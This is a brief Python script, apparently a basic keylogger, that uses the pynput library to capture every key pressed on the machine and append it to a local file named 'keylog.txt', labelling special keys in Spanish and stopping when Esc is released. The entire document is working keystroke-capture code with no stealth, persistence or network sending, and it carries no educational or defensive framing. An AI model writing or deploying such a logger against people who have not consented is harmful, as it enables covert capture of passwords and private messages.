from pynput.keyboard import Key, Listener

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f" {key.char} ")
    except AttributeError:
        with open(log_file, 'a') as f:
            f.write(f"\n Tecla especial: {key}")

def on_release(key):
    if key == Key.esc:
        return False  

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    
